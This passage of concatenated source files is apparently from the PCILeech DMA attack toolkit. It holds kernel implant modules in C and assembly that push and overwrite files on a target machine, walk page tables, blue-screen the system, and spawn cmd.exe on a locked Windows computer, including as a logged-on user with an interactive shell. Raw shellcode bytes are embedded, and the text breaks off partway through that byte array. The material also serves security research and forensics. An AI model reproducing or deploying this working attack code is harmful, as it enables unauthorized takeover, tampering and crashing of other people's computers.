// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_filepush.c
// ml64 wx64_common_a.asm /Fewx64_filepush.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_filepush.obj wx64_common.obj
// shellcode64.exe -o wx64_filepush.exe "PUSH FILES TO TARGET SYSTEM                                    \n===============================================================\nPush a file from the local system to the target system.        \nWARNING! Existing files will be overwritten!                   \nREQUIRED OPTIONS:                                              \n  -in  : file to push to target system from this system.       \n         filename is given in normal format.                   \n         Example: '-in c:\temp\myexefile.exe'                  \n  -s : file on target system.                                  \n         filename is given in kernel format (\??\-prefix)      \n         Example: '-s \??\c:\program files\myexefile.exe'      \n===== PUSH ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nNTSTATUS      : 0x%08X\nBYTES WRITTEN : 0x%08X\n===============================================================\n"
// 
#include "wx64_common.h"

#define STATUS_UNSUCCESSFUL						0xC0000001
#define OBJ_CASE_INSENSITIVE    				0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT			0x00000020
#define FILE_OVERWRITE_IF						0x00000005
#define OBJ_KERNEL_HANDLE       				0x00000200

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	NTSTATUS nt;
	HANDLE hFile;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	ANSI_STRING _sa;
	UNICODE_STRING _su;
	KERNEL_FUNCTIONS ofnk;
	PKERNEL_FUNCTIONS fnk;
	if(!pk->dataInStr[0]) {
		pk->dataOut[0] = (QWORD)STATUS_UNSUCCESSFUL;
		return;
	}
	// initialize kernel functions and strings
	InitializeKernelFunctions(pk->AddrKernelBase, &ofnk);
	fnk = &ofnk;
	fnk->RtlInitAnsiString(&_sa, pk->dataInStr);
	fnk->RtlCopyMemory(pk->dataOutStr, pk->dataInStr, 260);
	fnk->RtlAnsiStringToUnicodeString(&_su, &_sa, TRUE);	
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(
		&_oa, 
		&_su,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);
	// open, write and close file.
	if(fnk->KeGetCurrentIrql() != PASSIVE_LEVEL) {
		pk->dataOut[0] = (QWORD)STATUS_UNSUCCESSFUL;
		goto cleanup;
	}
	nt = fnk->ZwCreateFile(&hFile, GENERIC_WRITE, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if(0 != nt) {
		pk->dataOut[0] = nt;
		goto cleanup;
	}
	nt = fnk->ZwWriteFile(hFile, NULL, NULL, NULL, &_io, (PVOID)(pk->DMAAddrVirtual + pk->dataInExtraOffset), (ULONG)pk->dataInExtraLength, 0, 0);
	fnk->ZwClose(hFile);
	if(0 != nt) {
		pk->dataOut[0] = nt;
		goto cleanup;
	}
	pk->dataOut[1] = pk->dataInExtraLength;
cleanup:
	fnk->RtlFreeUnicodeString(&_su);
}
```

`pcileech_shellcode/wx64_pageinfo.asm`:

```asm
; wx64_pageinfo.asm : shellcode assembly for retrieving various CPU registers.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;
; compile with:
; ml64 wx64_pageinfo.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main
; shellcode64.exe -o wx64_pageinfo.exe "PAGEINFO: Results:%s\n  CR0=%016llX\n  CR2=%016llX\n  CR3=%016llX\n  CR4=%016llX\n"
;

.CODE

; ----------------------------------------------------
; Fetch control registers and store in dataOut.
; rcx = 1st parameter (PKMDDATA)
; rdx = 2nd parameter (ptr to dataIn)
; r8  = 3rd parameter (ptr to dataOut)
; on exit:
; dataOut[0] = cr0
; dataOut[1] = cr2
; dataOut[2] = cr3
; dataOut[3] = cr4
; ----------------------------------------------------
main PROC
	MOV rax, cr0
	MOV [r8-00h], rax
	MOV rax, cr2
	MOV [r8+08h], rax
	MOV rax, cr3
	MOV [r8+10h], rax
	MOV rax, cr4
	MOV [r8+18h], rax
	RET
main ENDP

END

```

`pcileech_shellcode/wx64_pagesignature.c`:

```c
// wx64_pagesignature.c : kernel code to create a page signature from system module / driver.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_pagesignature.c
// ml64.exe wx64_common_a.asm /Fewx64_pagesignature.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pagesignature.obj wx64_common.obj
// shellcode64.exe -o wx64_pagesignature.exe "MODULE SIGNATURE INFORMATION\n===========================================================\nSyntax: pcileech.exe -s <modulename.sys>\nGENERAL INFORMATION BELOW:\n  MODULE    : %s \n  BASE PHYS : %016llX\n  BASE VIRT : %016llX\n  SIZE      : %016llX\n  #CUNKS    : %i\n  MJ_CREATE : %016llX\nPAGING INFORMATION BELOW:\n  CR3       : %016llX\n  PML4E     : %016llX\n  PDPTE     : %016llX\n  PDE       : %016llX\n  PTE       : %016llX\nSIGNATURE IS SHOWN BELOW:\n"
//
#include "wx64_common.h"

typedef struct tdSignaturePTE {
	WORD cPages;
	WORD wSignature;
} SIGNATUREPTE, *PSIGNATUREPTE;

#define IRP_MJ_CREATE							0x00
#define IRP_MJ_MAXIMUM_FUNCTION					0x1b

typedef struct _DRIVER_EXTENSION {
	struct _DRIVER_OBJECT *DriverObject;
	PVOID AddDevice;
	ULONG Count;
	UNICODE_STRING ServiceKeyName;
} DRIVER_EXTENSION, *PDRIVER_EXTENSION;

typedef struct _DRIVER_OBJECT {
	SHORT Type;
	SHORT Size;
	PVOID DeviceObject;
	ULONG Flags;
	PVOID DriverStart;
	ULONG DriverSize;
	PVOID DriverSection;
	PDRIVER_EXTENSION DriverExtension;
	UNICODE_STRING DriverName;
	PUNICODE_STRING HardwareDatabase;
	PVOID FastIoDispatch;
	PVOID DriverInit;
	PVOID DriverStartIo;
	PVOID DriverUnload;
	PVOID MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];
} DRIVER_OBJECT, *PDRIVER_OBJECT;

//----------------------------------------------------------------------------------------------------------

#define OBJ_CASE_INSENSITIVE					0x00000040
#define H_ObReferenceObjectByName				0x92869205
#define H_IoDriverObjectType					0xc4d8b5e4

typedef struct tdKERNEL_FUNCTIONS2 {
	NTSTATUS(*ObReferenceObjectByName)(
		_In_ PUNICODE_STRING ObjectPath,
		_In_ ULONG Attributes,
		_In_ PVOID PassedAccessState,
		_In_ ACCESS_MASK DesiredAccess,
		_In_ PVOID ObjectType,
		_In_ MODE AccessMode,
		_Inout_ PVOID ParseContext,
		_Out_ PVOID *ObjectPtr
		);
} KERNEL_FUNCTIONS2, *PKERNEL_FUNCTIONS2;

VOID InitializeKernelFunctions2(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS2 fnk2)
{
	QWORD FUNC2[][2] = {
		{ &fnk2->ObReferenceObjectByName,			H_ObReferenceObjectByName }
	};
	for(QWORD j = 0; j < (sizeof(FUNC2) / sizeof(QWORD[2])); j++) {
		*(PQWORD)FUNC2[j][0] = PEGetProcAddressH(qwNtosBase, (DWORD)FUNC2[j][1]);
	}
}

QWORD GetPTE(_In_ PKERNEL_FUNCTIONS fnk, _In_ QWORD qwVA, _Out_opt_ QWORD qwaPageInfo[5])
{
	//QWORD buf, paPML4, paPDPT, paPD, paPT, qwPTE;
	QWORD buf, qwCR3, qwPML4E, qwPDPTE, qwPDE, qwPTE;
	// pml4 -> pdpt
	qwCR3 = GetCR3();
	buf = (QWORD)fnk->MmMapIoSpace(qwCR3 & ~0xfff, 4096, 0);
	if(!buf) { return 0; }
	qwPML4E = *(PQWORD)(buf + (((qwVA >> 39) & 0x1FF) << 3));
	fnk->MmUnmapIoSpace((PVOID)buf, 4096);
	if(!(qwPML4E & ~0xFFF)) { return 0; }
	// pdpt -> pd
	buf = (QWORD)fnk->MmMapIoSpace(qwPML4E & ~0xFFF, 4096, 0);
	if(!buf) { return 0; }
	qwPDPTE = *(PQWORD)(buf + (((qwVA >> 30) & 0x1FF) << 3));
	fnk->MmUnmapIoSpace((PVOID)buf, 4096);
	if(!(qwPDPTE & ~0xFFF)) { return 0; }
	// pd -> pt
	buf = (QWORD)fnk->MmMapIoSpace(qwPDPTE & ~0xFFF, 4096, 0);
	if(!buf) { return 0; }
	qwPDE = *(PQWORD)(buf + (((qwVA >> 21) & 0x1FF) << 3));
	fnk->MmUnmapIoSpace((PVOID)buf, 4096);
	if(!(qwPDE & ~0xFFF)) { return 0; }
	// pt -> pte
	buf = (QWORD)fnk->MmMapIoSpace(qwPDE & ~0xFFF, 4096, 0);
	if(!buf) { return 0; }
	qwPTE = *(PQWORD)(buf + (((qwVA >> 12) & 0x1FF) << 3));
	fnk->MmUnmapIoSpace((PVOID)buf, 4096);
	if(qwaPageInfo) {
		qwaPageInfo[0] = qwCR3;
		qwaPageInfo[1] = qwPML4E;
		qwaPageInfo[2] = qwPDPTE;
		qwaPageInfo[3] = qwPDE;
		qwaPageInfo[4] = qwPTE;
	}
	return qwPTE;
}

//----------------------------------------------------------------------------------------------------------

VOID PageTable_CreateSignature(_In_ PKERNEL_FUNCTIONS fnk, _In_ QWORD qwAddressMin, _In_ QWORD qwAddressMax, _Out_ PSIGNATUREPTE pPTEs, _Inout_ PQWORD pcPTEs)
{
	PSIGNATUREPTE pPTE = pPTEs;
	QWORD cPTE = 0, qwAddress = 0, qwPTE = 0;
	WORD wSignature;
	qwAddressMin &= 0x0fffffffffffff000;
	qwAddressMax &= 0x0fffffffffffff000;
	for(qwAddress = qwAddressMin; qwAddress <= qwAddressMax; qwAddress += 0x1000) {
		qwPTE = GetPTE(fnk, qwAddress, NULL);
		wSignature = (qwPTE & 0x07) | ((qwPTE >> 48 ) & 0x8000);
		if(wSignature == pPTE->wSignature) { // same as previous
			pPTE->cPages++;
			continue;
		}
		if(pPTE->cPages) {
			cPTE++;
			if(cPTE >= *pcPTEs) {
				break;
			}
			pPTE = pPTEs + cPTE;
		}
		pPTE->cPages++;
		pPTE->wSignature = wSignature;
	}
	*pcPTEs = cPTE;
}

PVOID PageTable_GetAddrMajorFunction(_Inout_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _In_ LPWSTR wszDriver)
{
	NTSTATUS nt;
	PDRIVER_OBJECT pDriver = NULL;
	PVOID* ppvIoDriverObjectType;
	UNICODE_STRING usDriver;
	UNREFERENCED_PARAMETER(pk);
	ppvIoDriverObjectType = PEGetProcAddressH(pk->AddrKernelBase, H_IoDriverObjectType);
	fnk->RtlInitUnicodeString(&usDriver, wszDriver);
	nt = fnk2->ObReferenceObjectByName(&usDriver, OBJ_CASE_INSENSITIVE, NULL, 0, *ppvIoDriverObjectType, KernelMode, NULL, &pDriver);
	if(NT_ERROR(nt)) { return nt; }
	return pDriver->MajorFunction[IRP_MJ_CREATE];
}

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	CHAR szDriverNtfs[] = { 'n', 't', 'f', 's', '.', 's', 'y', 's', 0 };
	CHAR szDriverFastFAT[] = { 'f', 'a', 's', 't', 'f', 'a', 't', '.', 's', 'y', 's', 0 };
	WCHAR wszDriverNtfs[] = { '\\', 'F', 'i', 'l', 'e', 'S', 'y', 's', 't', 'e', 'm', '\\', 'N', 't', 'f', 's', 0 };
	WCHAR wszDriverFastFAT[] = { '\\', 'F', 'i', 'l', 'e', 'S', 'y', 's', 't', 'e', 'm', '\\', 'F', 'a', 's', 't', 'F', 'A', 'T', 0 };
	KERNEL_FUNCTIONS fnk;
	KERNEL_FUNCTIONS2 fnk2;
	QWORD i, cSigPTEs = 32, qwModuleBase;
	PSIGNATUREPTE pSigPTEs = (PSIGNATUREPTE)(pk->DMAAddrVirtual + pk->dataOutExtraOffset);
	InitializeKernelFunctions(pk->AddrKernelBase, &fnk);
	InitializeKernelFunctions2(pk->AddrKernelBase, &fnk2);
	qwModuleBase = KernelGetModuleBase(&fnk, pk->dataInStr);
	if(qwModuleBase) {
		pk->dataOut[0] = fnk.MmGetPhysicalAddress((PVOID)qwModuleBase);
		pk->dataOut[1] = qwModuleBase;
		pk->dataOut[2] = PEGetImageSize(qwModuleBase);
		for(i = 0; i < cSigPTEs; i++) {
			pSigPTEs[i].cPages = 0;
			pSigPTEs[i].wSignature = 0;
		}
		PageTable_CreateSignature(
			&fnk,
			qwModuleBase,
			qwModuleBase + PEGetImageSize(qwModuleBase),
			pSigPTEs,
			&cSigPTEs);
		pk->dataOut[3] = cSigPTEs;
		if(0 == fnk._stricmp(szDriverNtfs, pk->dataInStr)) {
			pk->dataOut[4] = PageTable_GetAddrMajorFunction(pk, &fnk, &fnk2, wszDriverNtfs);
		} else if(0 == fnk._stricmp(szDriverFastFAT, pk->dataInStr)) {
			pk->dataOut[4] = PageTable_GetAddrMajorFunction(pk, &fnk, &fnk2, wszDriverFastFAT);
		}
		pk->dataOutExtraLength = cSigPTEs * sizeof(SIGNATUREPTE);
		fnk.RtlCopyMemory(pk->dataOutStr, pk->dataInStr, MAX_PATH);
		GetPTE(&fnk, qwModuleBase, &pk->dataOut[5]);
	}
}

```

`pcileech_shellcode/wx64_psblue.asm`:

```asm
; wx64_psblue.asm : shellcode assembly to just bluescreen the computer due to invalid opcodes
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;
; compile with:
; ml64 wx64_psblue.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main
; shellcode64.exe -o wx64_psblue.exe "BLUE SCREEN THE MACHINE!                                         \n=================================================================\nREQUIRED OPTIONS:                                                \n  -0   : Set to one (1) in order to activate.                    \n         Example: '-0 1'.                                        \n=================================================================\n"
;

.CODE

; ----------------------------------------------------
; bluescreen the computer if first qword in dataIn is not 0.
; rcx = 1st parameter (PKMDDATA)
; rdx = 2nd parameter (ptr to dataIn)
; r8  = 3rd parameter (ptr to dataOut)
; ----------------------------------------------------
main PROC
	MOV rax, [rdx-00h]
	TEST rax, rax
	JNZ bluescreen
	RET
	bluescreen:
	dq 0ffffffffffffffffh, 0ffffffffffffffffh
main ENDP

END

```

`pcileech_shellcode/wx64_pscreate.c`:

```c
// wx64_pscreate.c : create/spawn new user mode processes.
// Compatible with Windows x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with (wx64_pscreate):
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel /D_WIN7_COMPAT wx64_pscreate.c
// ml64 wx64_common_a.asm /Fewx64_pscreate.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pscreate.obj wx64_common.obj
// shellcode64.exe -o wx64_pscreate.exe "PROCESS CREATOR - SPAWN NEW PROCESSES ON TARGET!               \n===============================================================\nREQUIRED OPTIONS:                                              \n  -s   : Executable path including command line options.       \n         Example: '-s c:\windows\system32\cmd.exe'.            \n  -0   : Parent process PID to start new process from.         \n         Example '-0 0x0fe0'.                                  \nOPTIONAL OPTIONS:                                              \n  -1   : CreateProcess creation flags (dwCreationFlags) as     \n         specified on MSDN. Hidden Window = 0x08000000         \n  -2   : Redirect input - use to spawn interactive shell.      \n         Example: 0x01                                         \n  -3   : Timeout in seconds. Default: 60.                      \n  -4   : Boost (Windows 7 only): higher success ratio, but     \n         parent process may crash. Example 1. Default 0.       \n===== DETAILED INFORMATION AFTER PROCESS CREATION ATTEMPT =====%s\nNTSTATUS        : 0x%08X                                       \nADDITIONAL INFO : 0x%04X                                       \n===============================================================\n"
//
// ALTERNATIVELY (wx64_pscmd):
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel /D_PSCMD /D_PSCMD_SYSTEM /D_WIN7_COMPAT wx64_pscreate.c
// ml64 wx64_common_a.asm /Fewx64_pscmd.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pscreate.obj wx64_common.obj
// shellcode64.exe -o wx64_pscmd.exe "PROCESS CREATOR - AUTOMATICALLY SPAWN CMD.EXE ON TARGET!        \n================================================================\nAutomatically spawn a CMD.EXE on the target system. This utility\nonly work if the target system is locked and the login screen is\nvisible. If it takes time waiting - then please touch any key on\nthe target system.   If the utility fails multiple times, please\ntry wx64_pscreate instead.                                      \n===== DETAILED INFORMATION AFTER PROCESS CREATION ATTEMPT ======%s\nNTSTATUS        : 0x%08X                                        \nADDITIONAL INFO : 0x%04X                                        \n================================================================\n"
//
// ALTERNATIVELY (wx64_pscmd_user):
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel /D_PSCMD /D_PSCMD_USER /D_WIN7_COMPAT wx64_pscreate.c
// ml64 wx64_common_a.asm /Fewx64_pscmd_user.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pscreate.obj wx64_common.obj
// shellcode64.exe -o wx64_pscmd_user.exe "PROCESS CREATOR - AUTOMATICALLY SPAWN CMD.EXE AS USER ON TARGET!        \n================================================================\nAutomatically spawn a CMD.EXE on the target system. This utility\nwill spawn a cmd.exe in the context of a random logged on user.\nThis will work even though the computer may be locked. If this\nutility fails multiple times, please try wx64_pscreate instead.                                      \n===== DETAILED INFORMATION AFTER PROCESS CREATION ATTEMPT ======%s\nNTSTATUS        : 0x%08X                                        \nADDITIONAL INFO : 0x%04X                                        \n================================================================\n"
#include "wx64_common.h"

#define MAGIC_WAIT_WORD					0x01234123412341234
#define NUM_PARALELL_APC_THREADS		3

typedef enum _LOCK_OPERATION {
	IoReadAccess,
	IoWriteAccess,
	IoModifyAccess
} LOCK_OPERATION;

typedef enum _MM_PAGE_PRIORITY {
	LowPagePriority,
	NormalPagePriority = 16,
	HighPagePriority = 32
} MM_PAGE_PRIORITY;

typedef enum _MEMORY_CACHING_TYPE_ORIG {
	MmFrameBufferCached = 2
} MEMORY_CACHING_TYPE_ORIG;

typedef enum _KAPC_ENVIRONMENT {
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment
} KAPC_ENVIRONMENT;

typedef struct _KAPC_STATE {
	LIST_ENTRY ApcListHead[MaximumMode];
	struct _KPROCESS *Process;
	union {
		UCHAR InProgressFlags;
		struct {
			BOOLEAN KernelApcInProgress : 1;
			BOOLEAN SpecialApcInProgress : 1;
		};
	};
	BOOLEAN KernelApcPending;
	BOOLEAN UserApcPending;
} KAPC_STATE, *PKAPC_STATE, *PRKAPC_STATE;

typedef struct _KAPC {
	UCHAR Type;
	UCHAR SpareByte0;
	UCHAR Size;
	UCHAR SpareByte1;
	ULONG SpareLong0;
	struct _KTHREAD *Thread;
	LIST_ENTRY ApcListEntry;
	PVOID Reserved[3];
	PVOID NormalContext;
	PVOID SystemArgument1;
	PVOID SystemArgument2;
	CCHAR ApcStateIndex;
	KPROCESSOR_MODE ApcMode;
	BOOLEAN Inserted;
} KAPC, *PKAPC, *PRKAPC;

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID *PCLIENT_ID;

typedef struct SYSTEM_THREAD_INFORMATION {
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	LONG Priority;
	LONG BasePriority;
	LARGE_INTEGER ContextSwitches;
	ULONG ThreadState;
	ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[68];
	LONG BasePriority;
	HANDLE UniqueProcessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
	SYSTEM_THREAD_INFORMATION ThreadInfos[];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef struct tdUserShellConfig {
	CHAR  szProcToStart[MAX_PATH];
	QWORD qwAddrConsoleBuffer;
	DWORD fCreateProcess;
} USERSHELL_CONFIG, *PUSERSHELL_CONFIG;

//----------------------------------------------------------------------------------------------------------

typedef struct tdKERNEL_FUNCTIONS2 {
	PVOID(*IoAllocateMdl)(
		_In_opt_    PVOID   VirtualAddress,
		_In_        ULONG   Length,
		_In_        BOOLEAN SecondaryBuffer,
		_In_        BOOLEAN ChargeQuota,
		_Inout_opt_ PVOID   Irp
		);
	VOID(*KeInitializeApc)(
		_In_ PKAPC  Apc,
		_In_ PETHREAD  Thread,
		_In_ KAPC_ENVIRONMENT  TargetEnvironment,
		_In_ PVOID  KernelRoutine,
		_In_opt_ PVOID RundownRoutine,
		_In_ PVOID  NormalRoutine,
		_In_ KPROCESSOR_MODE  Mode,
		_In_ PVOID  Context
		);
	BOOLEAN(*KeInsertQueueApc)(
		_In_ PKAPC  Apc,
		_In_ PVOID  SystemArgument1,
		_In_ PVOID  SystemArgument2,
		_In_ UCHAR  PriorityBoost
		);
	VOID(*KeStackAttachProcess)(
		_Inout_ PEPROCESS   Process,
		_Out_   PRKAPC_STATE ApcState
		);
	VOID(*KeUnstackDetachProcess)(
		_In_ PRKAPC_STATE ApcState
		);
	PVOID(*MmAllocateContiguousMemory)(
		_In_ SIZE_T NumberOfBytes,
		_In_ QWORD HighestAcceptableAddress
		);
	VOID(*MmFreeContiguousMemory)(
		_In_ PVOID BaseAddress
		);
	PVOID(*MmMapLockedPagesSpecifyCache)(
		_In_     PVOID               MemoryDescriptorList,
		_In_     KPROCESSOR_MODE     AccessMode,
		_In_     MEMORY_CACHING_TYPE CacheType,
		_In_opt_ PVOID               BaseAddress,
		_In_     ULONG               BugCheckOnFailure,
		_In_     MM_PAGE_PRIORITY    Priority
		);
	VOID(*MmProbeAndLockPages)(
		_Inout_ PVOID           MemoryDescriptorList,
		_In_    KPROCESSOR_MODE AccessMode,
		_In_    LOCK_OPERATION  Operation
		);
	VOID(*ObDereferenceObject)(
		_In_ PVOID Object
		);
	LPSTR(*PsGetProcessImageFileName)(
		_In_  PEPROCESS Process
		);
	NTSTATUS(*PsLookupProcessByProcessId)(
		_In_  HANDLE    ProcessId,
		_Out_ PEPROCESS *Process
		);
	NTSTATUS(*PsLookupThreadByThreadId)(
		_In_  HANDLE   ThreadId,
		_Out_ PETHREAD *Thread
		);
	NTSTATUS(*RtlCreateUserThread)(
		_In_ HANDLE ProcessHandle,
		_In_ QWORD pSecurityDescriptor,
		_In_ BOOLEAN fCreateSuspended,
		_In_ QWORD StackZeroBits,
		_In_ SIZE_T* StackReserved,
		_In_ SIZE_T* StackCommit,
		_In_ QWORD EntryPoint,
		_In_ QWORD _opaque0,
		_Out_ PHANDLE ThreadHandle,
		_Out_ PCLIENT_ID ClientID
		);
	size_t(*strnlen)(
		const char *str,
		size_t numberOfElements
		);
	NTSTATUS(*ZwAllocateVirtualMemory)(
		_In_    HANDLE    ProcessHandle,
		_Inout_ PVOID     *BaseAddress,
		_In_    ULONG_PTR ZeroBits,
		_Inout_ PSIZE_T   RegionSize,
		_In_    ULONG     AllocationType,
		_In_    ULONG     Protect
		);
	NTSTATUS(*ZwOpenProcess)(
		_Out_    PHANDLE            ProcessHandle,
		_In_     ACCESS_MASK        DesiredAccess,
		_In_     POBJECT_ATTRIBUTES ObjectAttributes,
		_In_opt_ PCLIENT_ID         ClientId
		);

} KERNEL_FUNCTIONS2, *PKERNEL_FUNCTIONS2;

VOID InitializeKernelFunctions2(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS2 fnk2)
{
	DWORD i = 0, NAMES[18];
	NAMES[i++] = H_IoAllocateMdl;
	NAMES[i++] = H_KeInitializeApc;
	NAMES[i++] = H_KeInsertQueueApc;
	NAMES[i++] = H_KeStackAttachProcess;
	NAMES[i++] = H_KeUnstackDetachProcess;
	NAMES[i++] = H_MmAllocateContiguousMemory;
	NAMES[i++] = H_MmFreeContiguousMemory;
	NAMES[i++] = H_MmMapLockedPagesSpecifyCache;
	NAMES[i++] = H_MmProbeAndLockPages;
	NAMES[i++] = H_ObDereferenceObject;
	NAMES[i++] = H_PsGetProcessImageFileName;
	NAMES[i++] = H_PsLookupProcessByProcessId;
	NAMES[i++] = H_PsLookupThreadByThreadId;
	NAMES[i++] = H_RtlCreateUserThread;
	NAMES[i++] = H_strnlen;
	NAMES[i++] = H_ZwAllocateVirtualMemory;
	NAMES[i++] = H_ZwOpenProcess;
	while(i) {
		i--;
		*((PQWORD)fnk2 + i) = (QWORD)PEGetProcAddressH(qwNtosBase, NAMES[i]);
	}
}

//----------------------------------------------------------------------------------------------------------
// USER MODE SHELLCODE ASSIGNMENT BELOW:
//----------------------------------------------------------------------------------------------------------
#ifndef _EXEC_USER_EXTERNAL
VOID GetUserExecShellcode(_In_ PKMDDATA pk, _Out_ PBYTE *ppb, _Out_ PDWORD pcb)
{
	UNREFERENCED_PARAMETER(pk);
	BYTE wx64_exec_user_bin[] = {
		0xb0, 0x00, 0xb2, 0x01, 0x48, 0x8d, 0x0d, 0x49, 0x00, 0x00, 0x00, 0xf0,
		0x0f, 0xb0, 0x11, 0x75, 0x42, 0x48, 0x8d, 0x0d, 0xe8, 0xff, 0xff, 0xff,
		0x48, 0x81, 0xe1, 0x00, 0xf0, 0xff, 0xff, 0x65, 0x48, 0x8b, 0x14, 0x25,
		0x30, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18,
		0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0x12, 0x48, 0x8b,
		0x52, 0x20, 0x56, 0x48, 0x8b, 0xf4, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83,
		0xec, 0x20, 0xe8, 0xe1, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xe6, 0x5e, 0xc3,
		0x00, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74,
		0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x48, 0x63, 0x41, 0x3c, 0x4c,
		0x8b, 0xc9, 0x8b, 0xf2, 0x44, 0x8b, 0x84, 0x08, 0x88, 0x00, 0x00, 0x00,
		0x4c, 0x03, 0xc1, 0x45, 0x8b, 0x50, 0x20, 0x45, 0x8b, 0x58, 0x24, 0x4c,
		0x03, 0xd1, 0x41, 0x8b, 0x58, 0x1c, 0x4c, 0x03, 0xd9, 0x41, 0x8b, 0x78,
		0x18, 0x48, 0x03, 0xd9, 0x33, 0xc9, 0x85, 0xff, 0x74, 0x2d, 0x41, 0x8b,
		0x12, 0x49, 0x03, 0xd1, 0x45, 0x33, 0xc0, 0xeb, 0x0d, 0x0f, 0xb6, 0xc0,
		0x48, 0xff, 0xc2, 0x41, 0xc1, 0xc8, 0x0d, 0x44, 0x03, 0xc0, 0x8a, 0x02,
		0x84, 0xc0, 0x75, 0xed, 0x44, 0x3b, 0xc6, 0x74, 0x1c, 0xff, 0xc1, 0x49,
		0x83, 0xc2, 0x04, 0x3b, 0xcf, 0x72, 0xd3, 0x33, 0xc0, 0x48, 0x8b, 0x5c,
		0x24, 0x08, 0x48, 0x8b, 0x74, 0x24, 0x10, 0x48, 0x8b, 0x7c, 0x24, 0x18,
		0xc3, 0x41, 0x0f, 0xb7, 0x0c, 0x4b, 0x8b, 0x04, 0x8b, 0x49, 0x03, 0xc1,
		0xeb, 0xe3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b,
		0x41, 0x78, 0x48, 0x8b, 0xd9, 0x33, 0xc9, 0x48, 0x89, 0x08, 0x39, 0x8b,
		0x88, 0x00, 0x00, 0x00, 0x74, 0x22, 0x89, 0x8b, 0x88, 0x00, 0x00, 0x00,
		0x48, 0x8b, 0x4b, 0x58, 0xff, 0x53, 0x08, 0x48, 0x8b, 0x4b, 0x50, 0xff,
		0x53, 0x08, 0x48, 0x8b, 0x4b, 0x60, 0xff, 0x53, 0x08, 0x48, 0x8b, 0x4b,
		0x68, 0xff, 0x53, 0x08, 0x48, 0x8b, 0x43, 0x70, 0x48, 0xb9, 0xac, 0xda,
		0x37, 0x13, 0x00, 0x22, 0xda, 0xfe, 0x48, 0x89, 0x08, 0x48, 0x8b, 0x43,
		0x78, 0x48, 0x89, 0x08, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc,
